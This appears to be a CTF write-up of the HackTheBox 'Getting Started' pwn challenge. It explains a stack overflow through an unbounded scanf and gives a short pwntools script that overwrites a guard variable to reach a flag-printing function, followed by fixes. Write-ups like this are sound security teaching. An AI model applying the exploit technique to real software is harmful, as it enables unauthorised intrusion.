---
title: "Getting Started"
date: 2026-10-29 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, cwe-242, cwe-121, ret2win, pwntools]
description: "A Very Easy guided Pwn challenge: an unbounded scanf(\"%s\") overruns a stack buffer, and an inverted guard check means you win by corrupting a sentinel variable to trigger the flag-printing function."
---

## Overview

`Getting Started` is a Very Easy HackTheBox **Pwn** challenge — the guided intro to
binary exploitation. The provided `gs` binary reads input with an unbounded
`scanf("%s", buf)`, so anything longer than the buffer spills onto the stack. The
twist is an *inverted* guard check: a sentinel variable initialised to `0xdeadbeef`
is compared against `0xdeadbeef`, and you reach the flag-printing `win()` function by
**corrupting** it — the opposite of preserving a stack canary. A single
[stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html) of 48 bytes
flips the guard and dumps the flag.

## The technique

`main` reads attacker input into a 0x30-byte stack frame using
[`scanf("%s", buf)`](https://cwe.mitre.org/data/definitions/242.html) — an inherently
dangerous, length-unbounded function. A guard QWORD, `target`, sits just above the
buffer at `rbp-0x8`, initialised to `0xdeadbeef`. At the end of `main` the program does:

```nasm
mov  eax, 0xdeadbeef
cmp  QWORD [rbp-0x8], rax     ; compare guard to 0xdeadbeef
jne  win                      ; if it CHANGED -> call win()
```

Because the branch is `jne win`, you "win" by making the guard *differ* from
`0xdeadbeef`. `win()` simply `open()`s `./flag.txt` and writes it to stdout — no shell,
no libc leak, no ASLR/PIE defeat required, since the decision is gated on a stack value
the overflow can reach rather than on the saved return address.

The offset math is straightforward:

- Buffer starts at `rbp-0x30`; the guard is at `rbp-0x8`.
- Distance = `0x30 - 0x8 = 0x28 = 40` bytes of padding to reach the guard.
- Send `40 + 8 = 48` bytes; the trailing 8 bytes overwrite the full guard with
  `0x4141414141414141`, which is not `0xdeadbeef`.

## Solution

The binary helpfully prints the live stack layout before and after the overwrite, so
you can confirm the buffer-to-guard distance directly. The exploit is a few lines of
pwntools.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

payload = b'A' * 48          # 40 pad to reach rbp-0x8 + 8 bytes to clobber the guard

io = remote(HOST, PORT)
io.sendline(payload)
data = io.recvall(timeout=8)
m = re.search(rb'HTB\{[^}]+\}', data)
if m:
    success('FLAG: ' + m.group(0).decode())
io.close()
```

Run it against the spawned instance:

```bash
python3 solve.py <target-ip> <target-port>
```

The guard flips, `win()` fires, and the flag prints:

```
HTB{...}
```

(Flag value redacted. Note the binary also prints a red-herring `[-] You failed!` line
afterwards — `win()` has already dumped the flag before it appears.)

## Why it worked

`scanf("%s", buf)` performs no bounds checking, so input flows past the destination
buffer into adjacent stack variables. The program's own control-flow decision depends
on `target`, an in-band value sitting within reach of that
[overflow](https://cwe.mitre.org/data/definitions/787.html). Once attacker input can
write `target`, the `jne win` branch becomes attacker-controlled.

## Fix / defense

- Bound the read: `scanf("%39s", buf)` or, better, `fgets(buf, sizeof buf, stdin)`.
- Never use `gets()`, and never branch a security decision on an in-band stack value
  an overflow can reach.
- Build with `-fstack-protector-strong` and `-D_FORTIFY_SOURCE=2` (this binary shipped
  with no stack canary).
